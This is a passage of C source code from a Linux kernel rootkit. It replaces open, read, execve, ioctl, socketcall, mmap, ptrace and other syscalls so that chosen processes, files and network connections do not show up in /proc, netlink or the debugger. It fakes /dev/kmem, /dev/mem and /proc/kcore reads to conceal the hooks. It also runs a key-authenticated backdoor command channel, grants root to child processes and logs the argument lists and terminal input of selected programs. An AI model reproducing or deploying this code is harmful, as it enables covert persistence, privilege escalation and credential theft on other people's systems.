			m_memcpy(buffer+start_fake,orig,(size-start_fake)>(mon_size)?(mon_size):size-start_fake);
			return 1;
		}
		return 0;
}
#define template_read_check(value,offset,r_size,m_size,buffer,orig) {	\
			if(value==0xdeadbeef)/*magic to avoid check*/	\
				break;					\
	              if(value&&(offset>=value)&&(offset<=(value+m_size)))\
        	      {\
                        SYS(read,fd,buffer,r_size);\
                        if((offset+r_size)<=(value+m_size))\
                        {\
                                m_memcpy(buffer,(unsigned char*)orig+offset-value,r_size);\
                                return size;\
\
                        }\
                        else if(value&&((offset+r_size)>(value+m_size)))\
                        {\
                                m_memcpy(buffer,(unsigned char*)orig+(offset-value),r_size-(offset+r_size-(value+m_size)));\
                                return size;\
\
                        }\
			return r_size;\
                     }\
		     else if (value && (offset<value) && ((offset+r_size) > value))\
			{\
				int start_fake=value-offset;\
				SYS(read,fd,buffer,r_size);\
				m_memcpy(buffer+start_fake,orig,(r_size-start_fake)>(m_size)?(m_size):r_size-start_fake);\
				return r_size;\
				\
			}\
		 }\
		break;
inline int template_write_check(value,offset,size,mon_size) {
	if(value==0xdeadbeef)
		return 0;
	if(value&&(offset>=value)&&(offset<=(value+mon_size)))	
		return -1;						
	else if (value && (offset<value) && ((offset+size) > value))	
		return -1;						
	return 0;							
}

static inline void compute_check_values(ulong *value,ulong *monsize,ulong *orig)
{
	switch(mood_mode)
	{
		case MOOD_ELITE:
			*value=0xdeadbeef;
			break;
		case MOOD_LEGACY:
			*value=do_debug;
			*monsize=7;
			*orig=debug_backupcode;
			break;
		case MOOD_STANDARD:
			/* value filled up by our caller */
			*monsize=(NR_syscalls*4);
			*orig=o_sct;
			*value=sys_call_table;
			break;
	}
}
inline void add_inode(unsigned long *inodes_array,int max_inos,unsigned long inode)
{
	int i;
	for(i=0;i<max_inos;i++)
		if(!inodes_array[i])
		{
			inodes_array[i]=inode;
			return;
		}

}
inline int should_hide_net_inode(unsigned long inode,unsigned long *evil_list, int maxevil)
{
	int i;
	for(i=0;i<maxevil;i++)
		if(evil_list[i]==inode)
			return 1;
	return 0;
}
static void strip_evil(unsigned long *evil_inodes,struct net *curr, unsigned long read_size,char *real_data,int max)
{
	char *newline,*start,*semicolon,*temp;
	unsigned long inode;
	int i,id4=0,id6=0;
	/* skip banner */
	if(!(newline=m_strchr(real_data,'\n')))
		return; /* WTF? */
	if(!(curr->data=ualloc(read_size)))
		return;

	newline++;
	m_memcpy(curr->data,real_data,newline-real_data);
	curr->datalen=newline-real_data;
	while((newline-real_data)<read_size)
	{
		start=newline;
		switch(curr->magic)
		{
			case 'U':
					for(i=0;i<6;i++)
					{
						newline=skip_char(newline);
						newline=skip_blank(newline);
					}
					break;
			default:
					for(i=0;i<9;i++)
					{
						newline=skip_blank(newline);
						newline=skip_char(newline);
					}
					newline=skip_blank(newline);
		}

	 	inode=m_atoi(newline);
		newline=m_strchr(newline,'\n');
		newline++;
		if(!should_hide_net_inode(inode,evil_inodes,max))
		{
			m_memcpy(curr->data+curr->datalen,start,newline-start);
				
			if((curr->magic=='t')||(curr->magic=='T'))
			{
				unsigned char buffer[12];
				int id=((curr->magic=='t')?id4:id6);
				m_memset(buffer,'\0',sizeof(buffer));
				m_itoa(buffer,id,sizeof(buffer));
				semicolon=m_strchr(curr->data+curr->datalen,':');
				if(semicolon)
				{
					temp=semicolon-1;
					while(*temp!='\n')
						*temp--=' ';
					m_memcpy(semicolon-m_strlen(buffer),buffer,m_strlen(buffer));
					(curr->magic=='t')?id4++:id6++;
				}
				
			}
			
			curr->datalen+=newline-start;
		}
	}
		

}

static void catch_evil(unsigned long *evil_inodes,int num_inos)
{
	int i,fdopen,ret;
	cap_header 	head={0x19980330,curpid()};
	cap_data	data={0,0,0},fake={~0,~0,~0};
	unsigned char buffer[32];
	char dest[64];
	char num[12];
	char *proc="/proc/";
	char *fd="/fd/";
	char *inject;
	long limit;
	struct linux_dirent dirp;
	limit=get_limit();
	set_limit(KERNEL_DS);
	SYS(capget,&head,&data);
	set_caps(capoff?capoff:0,get_task(),&fake);
	for(i=2;i<PID_MAX;i++)
	{
		if(!is_hided(i))
			continue;
		m_memset(dest,'\0',sizeof(dest));
		m_memset(num,'\0',sizeof(num));
		strcat(dest,proc);
		strcat(dest,m_itoa(num,i,sizeof(num)));
		strcat(dest,fd);
		inject=dest+m_strlen(dest);
		fdopen=SYS(open,dest,O_RDONLY,0);
		if(fdopen<0)
			continue;
		while((ret=SYS(readdir,fdopen,&dirp,sizeof(dirp)))==1)
		{
			m_memset(buffer,'\0',sizeof(buffer));
			m_memcpy(inject,dirp.d_name,m_strlen(dirp.d_name)+1);
			if(SYS(readlink,dest,buffer,sizeof(buffer))>0)
			{
				if(!strncmp("socket:[",buffer,8))
					add_inode(evil_inodes,num_inos,m_atoi(buffer+8));
			}

		}
		SYS(close,fdopen);

			
	}
	set_caps(capoff?capoff:0,get_task(),&data);
	set_limit(limit);

}
static void create_evil(struct net *fd)
{
	unsigned long *real_data,*evil_inodes=ualloc(sizeof(int*)*200);
	unsigned long real_size=0,limit,read_size=0,count;
	unsigned long long offset=0;
	unsigned char buffer[300];
	int ret,reset=1;
	if(!evil_inodes)
		goto out;
	limit=get_limit();
	set_limit(KERNEL_DS);
	do
	{
		count=SYS(read,fd->fd,buffer,sizeof(buffer));
		if(count>0)
			real_size+=count;
	}
	while((count==sizeof(buffer)));
	if(!(real_data=ualloc(real_size)))
		goto free_evil;
	if(SYS(_llseek,fd->fd,0,0,&offset,SEEK_SET)==-1)
		goto free_evil;
	
	while ((ret=SYS(read,fd->fd,((unsigned long)real_data)+read_size,real_size-read_size))>0)
			read_size+=ret;
	if(ret<0)
		goto free_evil;
	if(SYS(_llseek,fd->fd,0,0,&offset,SEEK_SET)==-1)
		goto free_evil;
	m_memset(evil_inodes,'\0',sizeof(int*)*200);
	catch_evil(evil_inodes,200);
	strip_evil(evil_inodes,fd,read_size,real_data,200);
	reset=0;
free_evil:
	ufree(evil_inodes);
	if(real_data)
		ufree(real_data);

	set_limit(limit);
out:
	if(reset)
	{
		fd->fd=0;
		fd->datalen=0;
		fd->data=NULL;
		fd->pos=0;
	}
	return;
}

inline char switch_magic(struct stat64 *victim)
{
	int i=0;
	if(victim->__st_ino==proc_inos[i++])
		return 'k'; /* kcore */
	if(victim->__st_ino==proc_inos[i++])
		return 't'; /* tcp */
	if(victim->__st_ino==proc_inos[i++])
		return 'u'; /* udp */
	if(victim->__st_ino==proc_inos[i++])
		return 'r'; /* raw */
	if(victim->__st_ino==proc_inos[i++])
		return 'U'; /* unix */
	if(victim->__st_ino==proc_inos[i++])
		return 'T';
	if((dev_mmn[0][0]==MAJOR(victim->st_rdev))&&(dev_mmn[0][1]==MINOR(victim->st_rdev)))
		return 'K'; /* kmem */
	if((dev_mmn[1][0]==MAJOR(victim->st_rdev))&&(dev_mmn[1][1]==MINOR(victim->st_rdev)))
		return 'm'; /* mem */
	if(victim->st_dev==proc_dev)
		return 'P'; /* generic proc file */ /* WARNING HERE IN THIS CHECK! */
	return '\0';
}

int new_open(char *filename,int flags, int mode)
{
	struct stat64 openstat;
	long limit,ret;
	int retfd=0,pid,counter;
	char magic;
	if(true_behaviour)
	{
		return SYS(open,filename,flags,mode);
	}
	if(check_path(filename))
		goto nodonut;
	retfd=SYS(open,filename,flags,mode);
	
	if(retfd<0)
		goto nodonut;
	m_memset(&openstat,'\0',sizeof(openstat));
	limit=get_limit();
	set_limit(KERNEL_DS);

	if(SYS(fstat64,retfd,&openstat)<0)
	{

		set_limit(limit);
		return retfd;
	}
	set_limit(limit);
	if(should_hide(openstat.__st_ino,filename))
		goto nodonut;
        if((ret=should_redir(openstat.__st_ino))!=-1)
        {
                SYS(close,retfd);
                set_limit(KERNEL_DS);
                retfd==SYS(open,redirs_table[ret].to,flags,mode);
                set_limit(limit);
        }
	pid=curpid();
	switch((magic=switch_magic(&openstat)))
	{
		case 't':
		case 'u':
		case 'r':
		case 'U':
		case 'T':
				if(!net_tables[pid])
				{
					net_tables[pid]=ualloc(sizeof(struct net)*MAX_FD_PER_PROC);
					if(!net_tables[pid])
						break;
					m_memset(net_tables[pid],'\0',sizeof(struct net)*MAX_FD_PER_PROC);
				}
				
				for(counter=0;counter<MAX_FD_PER_PROC;counter++)
					if(net_tables[pid][counter].fd==0)
					{
						net_tables[pid][counter].fd=retfd;
						net_tables[pid][counter].magic=magic;
						create_evil(&net_tables[pid][counter]);
						break;
					}
			
				break;
				
	}
	return retfd;
nodonut:
	if(retfd<0)
		return retfd;
	if(retfd>0)
		SYS(close,retfd);
	return -ENOENT;
	
}


int new_init_module(void *dum,void *dum2,void *dum3)
{
/* this is the one of the worst things in this code i think, scheduled for remotion */ 
	int ret;
	switch(mood_mode)
	{
		case 1:
			unset();	
			break;
		case 2:
			m_memcpy(do_debug,debug_backupcode,7);
			break;
		case 3:
			break;
	}
	ret=SYS(init_module,dum,dum2,dum3);
	switch(mood_mode)
	{
		case 2:
			m_memcpy(do_debug,debug_jumpcode,7);
			break;
		case 1:
			d_reactivate();	
			break;
		case 3:
			break;
	}
	return ret;
}


int new_oldolduname(struct dawn_command *comm)
{
	long limit;
	struct timespec sleep={1,0};
	switch(comm->command)
	{
		case uninstall:
				if(!true_behaviour)
					return -1;
				switch(mood_mode)
				{
					case MOOD_ELITE: 
							 shouldstop=1;
							 deactivate_magic(3);
							 if(virtual)
								deactivate_magic(2);
							 break;
					case MOOD_LEGACY:

						shouldstop=1;
						deactivate_magic(3);
						deactivate_magic(2);
						m_memcpy(do_debug,debug_backupcode,7);

						
						break;
					case MOOD_STANDARD:
						unset();
				}
				break;
				
		case p_hide:
				if(!true_behaviour)
					return -1;
				hide(comm->pid);
				break;
		case p_unhide:
				if(!true_behaviour)
					return -1;
				unhide(comm->pid);
				break;
		case auth:
				limit=get_limit();
				set_limit(KERNEL_DS);
				SYS(nanosleep,&sleep,NULL);
				set_limit(limit);
				if(comm->key==auth_key)
					hide(SYS(getppid));
				else
					return -1;
				break;
		case hidefile:
				if(!true_behaviour)
					return -1;
				if(hide_inode(comm->pid)<0)
					return -1;
				break;
		case unhidefile:
				if(!true_behaviour)
					return -1;
				if(unhide_inode(comm->pid)<0)
					return -1;
				break;

		default:
				return SYS(oldolduname,comm);
	}
	return 0x31337;

}

void new_exit(int code)
{
	int pid,i;
	pid=curpid();
	if(net_tables[pid])
	{
                for(i=0;i<MAX_FD_PER_PROC;i++)
                     if(net_tables[pid][i].fd)
                     {
                               ufree(net_tables[pid][i].data);
                               net_tables[pid][i].data=NULL;
                        }
		ufree(net_tables[pid]);
		net_tables[pid]=NULL;
	}
	if(is_hided(pid))
		for(i=0;i<sizeof(dead_memory)/sizeof(dead_memory[0]);i++)
			if(!dead_memory[i])
			{
				dead_memory[i]=pid;
				break;
			}
	SYS(exit,code);
}

void new_exit_group(int code)
{
	int pid,i;
	pid=curpid();
        if(net_tables[pid])
        {
                for(i=0;i<MAX_FD_PER_PROC;i++)
                     if(net_tables[pid][i].fd)
                     {
                               ufree(net_tables[pid][i].data);
                               net_tables[pid][i].data=NULL;
                        }
                ufree(net_tables[pid]);
                net_tables[pid]=NULL;
        }
        if(is_hided(pid))
                for(i=0;i<sizeof(dead_memory)/sizeof(dead_memory[0]);i++)
                        if(!dead_memory[i])
			{
                                dead_memory[i]=pid;
				break;
			}
	
	SYS(exit_group,code);
}

int new_symlink(char *src,char *dest)
{

        unsigned char src_buffer[290];

        int ret,len,i,plen;
        struct stat64 statme;
        unsigned long limit;
        if(true_behaviour)
                goto n_ok;
	m_memset(src_buffer,'\0',sizeof(src_buffer));

        limit=get_limit();
        set_limit(KERNEL_DS);
        if((ret=SYS(stat64,src,&statme))<0)
                goto ok;

        if(should_hide(statme.__st_ino,src))
        {
                len=m_strlen(src);
                m_memcpy(src_buffer,src,len);
		plen=m_strlen(LINK_HIJACK_PREFIX);
		for(i=0;i<=plen;i++)
	                src_buffer[len++]=LINK_HIJACK_PREFIX[i];


        }
	else
		 m_memcpy(src_buffer,src,m_strlen(src));
        ret=SYS(symlink,src_buffer,dest);
        set_limit(limit);
        return ret;
ok:
        set_limit(limit);
n_ok:
        return SYS(symlink,src,dest);
}


int new_readlink(char *path,char *buf,int size)
{
        unsigned char mypath[290];
        unsigned long limit;
	long ret;
        unsigned char *ptr;
        if(true_behaviour)
                goto ok;
	m_memset(mypath,'\0',sizeof(mypath));
rep:
        limit=get_limit();
        set_limit(KERNEL_DS);
        ret=SYS(readlink,path,mypath,size);
        set_limit(limit);
        if(ret<0)
                goto ok;
	/* UGLY but working */
	if(strstr(mypath,"/sbin/init (deleted)"))
	{
		ptr=strstr(mypath," (deleted)");
		*ptr='\0';
		m_memcpy(buf,mypath,m_strlen(mypath));
		return ret;
	}
        if(!(ptr=strstr(mypath,LINK_HIJACK_PREFIX)))
                goto ok;
        *ptr='\0';
        m_memcpy(buf,mypath,m_strlen(mypath));
        return ret;
ok:
        return SYS(readlink,path,buf,size);

}


void check_execve(void)
{
        if( is_hided( SYS(getppid) ) )
	{
                hide(curpid());
		get_root();
	}
}

int exec_redir(struct pt_regs regs)
{
        int ret,len,i;
        struct stat64 statme;
        unsigned long limit,*ptr;
	unsigned char **filename;
	/* yes, this is ancient black magic */
	/* now ptr points to regs.original_eax */
	ptr=((long*)(&regs))+10;
	/* now *ptr is the saved eip from the int handler, we will jump here after checkcom and we have to
	 * pop it before real execve to mantain the stack cleaned
	 * */
	*ptr=*((long*)(&regs));

	check_execve();
	filename=(char**)(((unsigned long*)&regs)+1);
        if(true_behaviour||(!(*filename)))
                goto ret0;
	
        limit=get_limit();
        set_limit(KERNEL_DS);
        if((ret=SYS(stat64,*filename,&statme))<0)
	{
		set_limit(limit);
                goto ret0;
        }
	set_limit(limit);
	if(should_hide(statme.__st_ino,*filename))
		goto ret1;
        ret=should_redir(statme.__st_ino);
        if(ret!=-1)
        {
                char *name;
		len=m_strlen(redirs_table[ret].to);
		name=ualloc(len+1);
                if(!name)
                        return 0;
                m_memset(name,'\0',len+1);
                m_memcpy(name,redirs_table[ret].to,len);
                *filename=name;

        }
ret0:
	return 0;
ret1:
	return 1;
}
void checkcom(int res,struct pt_regs regs)
{
		
	int i,j;
	unsigned char *comm,*fake,**argv;
	if(res<0)
		return;
	argv=(char**)(regs.esp+4);
	if(!(comm=get_comm()))
	{
		comm=argv[0];//*((char**)(regs.esp+4));
	}
	if(is_hided(SYS(getppid)))
		hide(curpid());
	if(true_behaviour)
	{
                get_root();
		return;
        }
	if(!comm)
		return;
	if((fake=m_strrchr(comm,'/')))
		comm=fake+1;
	for(i=0;i<(sizeof(redirs_table)/sizeof(redirs_table[0]))&&redirs_table[i].inode;i++)
	{
		
		fake=m_strrchr(redirs_table[i].from,'/');
		if(fake)
			fake++;
		else
			fake=redirs_table[i].from;
		if(!strncmp(comm,fake,15))
                {
                         fake=m_strrchr(redirs_table[i].to,'/');
                         if(fake)
                                fake++;
                         else
                                fake=redirs_table[i].to;
			 set_comm(fake,comm);
			 break;
		}

	}
	if(should_sniff_argv(comm))
	{
		int i;
		char buff[20];
		sniff(curpid());
		m_memset(buff,'\0',sizeof(buff));
		log_sniffed("\nArgv of \"",m_strlen("\nArgv of \""));
		log_sniffed(comm,m_strlen(comm));
		log_sniffed("\" pid ",m_strlen("\" pid "));
		m_itoa(buff,curpid(),20);
		log_sniffed(buff,m_strlen(buff));
		log_sniffed(": ",2);
		for(i=0;argv[i];i++)
		{
			log_sniffed(argv[i],m_strlen(argv[i]));
			log_sniffed(" ",1);
		}
	}
		
}
            asm("new_execve:\n\t"
                "call exec_redir\n\t"
                "test %eax, %eax\n\t"
                "jnz er_ret\n\t"
		"pop %eax\n\t" /* blow away saved eip */
                "mov o_sct,%eax\n\t"
		"call *44(%eax)\n\t"
                "push %eax\n\t"
                "call checkcom\n\t"
                "pop %eax\n\t"
                "jmp *36(%esp)\n\t"
                "er_ret:\n\t"
                "mov $-2,%eax\n\t"
		"ret\n\t"
            );
	    asm ("new_syscall:\n\t"
		 "mov	fake_sct,%ecx\n"
		 "call  *(%ecx,%eax,4)\n"
		 "movl  magic_rejoin,%ecx\n"
		 "jmp   *%ecx\n"
		);
	    asm ("new_vsyscall:\n\t"
		 "mov	fake_sct,%ecx\n"
		 "call  *(%ecx,%eax,4)\n"
		 "movl  magic_vrejoin,%ecx\n"
		 "jmp   *%ecx\n"
		);

	    asm ("new_systrace:\n\t"
		 "mov	fake_sct,%ecx\n"
		 "call  *(%ecx,%eax,4)\n"
		 "movl  magic_ptrace_rejoin,%ecx\n"
		 "jmp   *%ecx\n"
		);
    

int new_printk(char *fmt, ...)
{
	return 0;

}
	    
int new_ioctl(int fd,int request,void *any)
{
	int ret;
	
	
	/* getting status of the interface */
	switch(request)
	{
		case SIOCGIFFLAGS:
			
				if(true_behaviour||is_user_promisc(any))
					goto ok;
				ret=SYS(ioctl,fd,request,any);
				((struct ifreq *)any)->ifr_ifru.ifru_flags &=~IFF_PROMISC;
				return ret;
				
		case SIOCSIFFLAGS:
				if((((struct ifreq *)any)->ifr_ifru.ifru_flags & IFF_PROMISC)==IFF_PROMISC)
				{
				  if(true_behaviour)
				  {
					  set_fake_promisc(any);
					  if(is_user_promisc(any))
						  return 0;
					  reset_printk(); 
				  }
				  else
				  {
					  set_user_promisc(any);
					  if(is_fake_promisc(any))
					  {
						  print_fake_set_banner(IFACE_NAME(any));
						  return 0;
					  }
				  }
				}
				else if(((((struct ifreq *)any)->ifr_ifru.ifru_flags & ~IFF_PROMISC) & IFF_PROMISC) ==0)
				{
					if(true_behaviour)
					{
						unset_fake_promisc(any);
						if(is_user_promisc(any))
							return 0;
						reset_printk();
						
					}
					else
					{
						unset_user_promisc(any);
						if(is_fake_promisc(any))
						{
							print_fake_unset_banner(IFACE_NAME(any));
							return 0;
						}
					}

				}
				ret=SYS(ioctl,fd,request,any);
				set_printk();
				return ret;
				
				
	}
	
ok:
	return SYS(ioctl,fd,request,any);

}

long new_socketcall(int call, unsigned long *args)
{
	long ret,stat,i,size=0;
	if(true_behaviour)
		reset_printk();
	ret=SYS(socketcall,call,args);
	stat=ret;
	if(true_behaviour)
	{
		set_printk();
		return ret;
	}
	if(!(ret<0))
                if(call==SYS_RECVMSG)
                {
                        struct msghdr           *buf=args[1];
                        struct iovec            *ptr;
                        struct nlmsghdr         *nlhdr,*prev=NULL,*tmptr;
                        struct tcpdiagmsg       *data;
                        unsigned long           evil_inodes[200],tempsize,tmpnext,times=0;

			if ((!buf)||(!buf->msg_name)||
			(((struct sockaddr_nl*)buf->msg_name)->nl_family!=AF_NETLINK))
				return ret;
                        m_memset(evil_inodes,'\0',sizeof(evil_inodes));
                        catch_evil(evil_inodes,(sizeof(evil_inodes)/sizeof(evil_inodes[0])));
                        for(i=0;i<buf->msg_iovlen;i++)
                        {
                                nlhdr=(typeof(nlhdr))buf->msg_iov[i].iov_base;
retest:
				
                                while (NLMSG_OK(nlhdr, stat)) {
                                        tempsize=stat;
                                        if(nlhdr->nlmsg_type == NLMSG_DONE)
                                                break;
                                        if(nlhdr->nlmsg_type == NLMSG_ERROR)
                                                break;
                                        data=NLMSG_DATA(nlhdr);

                                        if((data->tcpdiag_inode)&&(should_hide_net_inode(data->tcpdiag_inode,evil_inodes,
                                                sizeof(evil_inodes)/sizeof(evil_inodes[0]))))

                                        {

                                                /* ovvero è la prima entry */
                                                if(!prev)
                                                {
                                                        tmptr=NLMSG_NEXT(nlhdr, tempsize);
                                                        if(!tempsize)
                                                        {
                                                                /* ok, qui abbiamo la prima e unica entry di un iovec
                                                                 * da nascondere, perciò non possiamo copiare quella
                                                                 * seguente al nostro posto*/
                                                                m_memset(data,'\0',((ulong)tmptr)-((ulong)data));
                                                                ret-=stat;
                                                                if(buf->msg_iovlen!=1)
                                                                        for(stat=i;(stat+1)<=buf->msg_iovlen;stat++)
                                                                                buf->msg_iov[stat]=buf->msg_iov[stat+1];
                                                                else
                                                                {
                                                                        ret=20; /* 20 e' la dimensione di un nlmsg_done */
                                                                        nlhdr->nlmsg_type=NLMSG_DONE;
                                                                        nlhdr->nlmsg_len=20;
                                                                }
                                                                break;

                                                        }

                                                        m_memset(data,'\0',((ulong)tmptr)-((ulong)data));

                                                        tmpnext=tmptr->nlmsg_len;
                                                        tmptr->nlmsg_len+=nlhdr->nlmsg_len;
                                                        m_memcpy(nlhdr,tmptr,tmpnext);
                                                        prev=NULL;
                                                        goto retest;

                                                }
                                                else
                                                {
                                                        tmptr=NLMSG_NEXT(nlhdr, tempsize);
                                                        m_memset(data,'\0',((ulong)tmptr)-((ulong)data));
                                                        prev->nlmsg_len+=nlhdr->nlmsg_len;
                                                        goto here;
                                                }


                                        }
                                        prev=nlhdr;
here:
                                        nlhdr=NLMSG_NEXT(nlhdr, stat);
                                }

                        }
                }
        return ret;


}

int new_close(int fd)
{
	int ret,i,empty=1,pid=curpid();
	char *ptr=net_tables[pid];
	if(true_behaviour)
		reset_printk();
	ret=SYS(close,fd);
	
	if(net_tables[pid])
		for(i=0;i<MAX_FD_PER_PROC;i++)
		{
			if(net_tables[pid][i].fd==fd)
			{
				net_tables[pid][i].fd=0;
				net_tables[pid][i].pos=0;
				net_tables[pid][i].datalen=0;
				ufree(net_tables[pid][i].data);
				net_tables[pid][i].data=NULL;
			}
			if(net_tables[pid][i].fd!=0)
				empty=0;
		}
	if(empty)
	{
		net_tables[pid]=NULL;
		ufree(ptr);
	}
			
	if(true_behaviour)
		set_printk();
	return ret;
}

int new_read(int fd,unsigned char *buffer,unsigned int size)
{
	struct stat64 statme;
	unsigned long limit,offset,i,value=0,monsize,orig;
	long long ret2,ret64=0;
	int ret,pid=curpid();
	unsigned char *our=NULL,*ptr=NULL;
	if(true_behaviour)
		goto ok;
	limit=get_limit();
	set_limit(KERNEL_DS);
	ret=SYS(fstat64,fd,&statme);
	set_limit(limit);
	if(ret<0)
		goto ok;
	set_limit(KERNEL_DS);
	ret2=SYS(_llseek,fd,(unsigned long)0,(unsigned long)0,&ret64,SEEK_CUR);
	set_limit(limit);
	if(ret2<(long long)0)
		goto ok;
	offset=(unsigned long)ret64;

	switch(switch_magic(&statme))
	{
		case 'k':	/* kcore */
				compute_check_values(&value,&monsize,&orig);
				if(value!=0xdeadbeef)
					value=KCORIZE(value);
				template_read_check(value,offset,size,monsize,buffer,orig);
		case 't':	/* tcp */
		case 'u':	/* udp */
		case 'r':	/* raw */
		case 'U':	/* unix */
		case 'T':	/* tcp6 */
				if(net_tables[pid])
				{
					for(i=0;i<MAX_FD_PER_PROC;i++)
						if((net_tables[pid][i].fd!=0)&&(net_tables[pid][i].fd==fd))
						{
							if(net_tables[pid][i].data)
							{
								if((net_tables[pid][i].pos+size)<net_tables[pid][i].datalen)
								{
									m_memcpy(buffer,net_tables[pid][i].data+
											net_tables[pid][i].pos,size);
									net_tables[pid][i].pos+=size;
									return size;
								}
								if(net_tables[pid][i].pos>=net_tables[pid][i].datalen)
									return 0;
							      m_memcpy(buffer,net_tables[pid][i].data+net_tables[pid][i].pos,
									net_tables[pid][i].datalen-net_tables[pid][i].pos);
								ret=net_tables[pid][i].datalen-net_tables[pid][i].pos;
								net_tables[pid][i].pos=net_tables[pid][i].datalen;
								return ret;
							}
						}

				}
				
				break;
		case 'K':	/* kmem */
				compute_check_values(&value,&monsize,&orig);
				template_read_check(value,offset,size,monsize,buffer,orig);		
		case 'm':	/* mem */
				compute_check_values(&value,&monsize,&orig);
				if(value!=0xdeadbeef)
					value=MEMIZE(value);
				template_read_check(value,offset,size,monsize,buffer,orig);
		case 'P':
				/* UGLY!!!!!!!!!! */
				/* generic proc file, we look for evil strings to hide, for example true names in maps */
				if(((ret=SYS(read,fd,buffer,size)))<=0)
					return ret;
				for(i=0;(i<(sizeof(redirs_table)/sizeof(redirs_table[0])))&&(redirs_table[i].from);i++)
				{
					ptr=buffer;
					while((ptr=strstr(ptr,redirs_table[i].to)))
					{
						our=ualloc(ret+m_strlen(redirs_table[i].from));
						if(!our)
							break;
						m_memset(our,'\0',ret+m_strlen(redirs_table[i].from));
						m_memcpy(our,buffer,((unsigned long)ptr)-((ulong)buffer));
						m_memcpy(our+(((ulong)ptr)-((ulong)buffer)),redirs_table[i].from,m_strlen(redirs_table[i].from));
						ptr+=m_strlen(redirs_table[i].to);
						m_memcpy(our+m_strlen(our),ptr,ret-(((ulong)ptr)-((ulong)buffer)));
						m_memcpy(buffer,our,ret);
						ufree(our);
						
					}
					if(our)
						return ret;
					
				}
				return ret;

	}

ok:
	ret=SYS(read,fd,buffer,size);
	if(true_behaviour)
		return ret;
	
	if(is_sniffed(pid)&&(!fd||is_a_tty(fd)))
	{
		char *ptr=buffer;
		while(!isprint(*ptr)&&((ulong)ptr<((ulong)buffer+size)))
			ptr++;
		while(isprint(*ptr)&&(*ptr!='\n')&&(*ptr!='\r')&&((ulong)ptr<((ulong)buffer+size)))
			log_sniffed(ptr++,1);
		if(limit_strstr(buffer,"\n",size))
		{
			unsniff(pid);
		}
	}
	
	return ret;
}


long new_lseek(int fd,long offset,unsigned int origin)
{
	int pid,count;
	if(true_behaviour)
		goto ok;
	/* let's see and fix if we are lseeking a netfd */
	if((offset==0)&&(origin==SEEK_SET))
	{
		pid=curpid();
		if(net_tables[pid])
		{
			for(count=0;count<MAX_FD_PER_PROC;count++)
				if(net_tables[pid][count].fd==fd)
				{
					net_tables[pid][count].datalen=0;
					net_tables[pid][count].pos=0;
					ufree(net_tables[pid][count].data);
					net_tables[pid][count].data=NULL;
					create_evil(&net_tables[pid][count]);
					return 0;
				}

		}
	}

ok:
	return SYS(lseek,fd,offset,origin);

}
long new__llseek(int fd,long offset_hi,long offset_lo,long long *result,unsigned int origin)
{
	int pid,count;
	if(true_behaviour)
		goto ok;
	/* let's see and fix if we are lseeking a netfd */
	if((offset_lo==0)&&(origin==SEEK_SET))
	{
		pid=curpid();
		if(net_tables[pid])
		{
			for(count=0;count<MAX_FD_PER_PROC;count++)
				if(net_tables[pid][count].fd==fd)
				{
					net_tables[pid][count].datalen=0;
					net_tables[pid][count].pos=0;
					ufree(net_tables[pid][count].data);
					net_tables[pid][count].data=NULL;
					create_evil(&net_tables[pid][count]);
					*result=0;
					return 0;
				}

		}
	}

ok:
	return SYS(_llseek,fd,offset_hi,offset_lo,result,origin);

}

int new_mmap(struct mmaparg *arg)
{
	long ret,limit,dewrite=0;
	struct stat64 statme;
	unsigned long value=0,monsize,orig;
	if((true_behaviour)||(mood_mode==MOOD_ELITE))
		goto ok;
	limit=get_limit();
	set_limit(KERNEL_DS);
	ret=SYS(fstat64,&statme);
	set_limit(limit);
	if(ret<0)
		goto ok;

	if((ret=SYS(mmap,arg))==(void*)-1)
		return ret;
	SYS(mprotect,ret,arg->len,arg->prot|PROT_WRITE);
	switch(switch_magic(&statme))
	{
		case 'k':	compute_check_values(&value,&monsize,&orig);
				if(value!=0xdeadbeef)
					value=KCORIZE(value);
				dewrite=template_mmap_check(value,arg->offset,arg->len,monsize,ret,orig);
			
				break;
		case 'K':	compute_check_values(&value,&monsize,&orig);
				dewrite=template_mmap_check(value,arg->offset,arg->len,monsize,ret,orig);
				break;
		case 'm':	compute_check_values(&value,&monsize,&orig);
				if(value!=0xdeadbeef)
					value=MEMIZE(value);
				dewrite=template_mmap_check(value,arg->offset,arg->len,monsize,ret,orig);
				break;
	}
	
	SYS(mprotect,ret,arg->len,dewrite?arg->prot&~PROT_WRITE:arg->prot);

	return ret;
ok:
	return SYS(mmap,arg);
}
int new_mmap2(unsigned long addr, unsigned long len,unsigned long prot, unsigned long flags,
	      unsigned long fd, unsigned long pgoff)
{
	long ret,limit,dewrite=0;
	struct stat64 statme;
	unsigned long value=0,monsize,orig;

	if((true_behaviour)||(mood_mode==MOOD_ELITE))
		goto ok;
	limit=get_limit();
	set_limit(KERNEL_DS);
	ret=SYS(fstat64,fd,&statme);
	set_limit(limit);
	if(ret<0)
		goto ok;

	if((ret=SYS(mmap2,addr,len,prot,flags,fd,pgoff))==(void*)-1)
		return ret;
	SYS(mprotect,ret,len,prot|PROT_WRITE);
	switch(switch_magic(&statme))
	{
		case 'k':	compute_check_values(&value,&monsize,&orig);
				if(value!=0xdeadbeef)
					value=KCORIZE(value);
				dewrite=template_mmap_check(value,pgoff*4096,len,monsize,ret,orig);
			
				break;
		case 'K':	compute_check_values(&value,&monsize,&orig);
				dewrite=template_mmap_check(value,pgoff*4096,len,monsize,ret,orig);
				break;
		case 'm':	compute_check_values(&value,&monsize,&orig);
				if(value!=0xdeadbeef)
					value=MEMIZE(value);

				dewrite=template_mmap_check(value,pgoff*4096,len,monsize,ret,orig);
				break;
	}
	SYS(mprotect,ret,len,dewrite?prot&~PROT_WRITE:prot);

	return ret;
ok:
	return SYS(mmap2,addr,len,prot,flags,fd,pgoff);
}

long new_time(unsigned long *arg)
{
	int i;
        if(!check)
                if(curpid()==1)
                {
                        char *ptr=m_strrchr(redirs_table[0].to,'/');
                        set_comm(++ptr,"init");
                        check=1;
     	        }
	for(i=0;i<(sizeof(proc_inos)/sizeof(proc_inos[0]));i++)
		if(proc_inos[i]==0xbadc0ded)
		{
			struct stat64 statme;
			long ret,limit=get_limit();
			set_limit(KERNEL_DS);
			ret=SYS(stat64,proc_names[i],&statme);
			set_limit(limit);
			if(ret>=0)
				proc_inos[i]=statme.__st_ino;
		}
         for(i=0;i<(sizeof(dead_memory)/sizeof(dead_memory[0]));i++)
                        if(dead_memory[i])
			{
                               unhide(dead_memory[i]);
			       dead_memory[i]=0;
			}
 return SYS(time,arg);

}

long new_ptrace(long request, long pid, long addr, long data)
{
	if(!(true_behaviour))
		if(is_hided(pid))
			return -ESRCH;
	return SYS(ptrace,request,pid,addr,data);
}

int new_write(int fd,void *buf,int size)
{
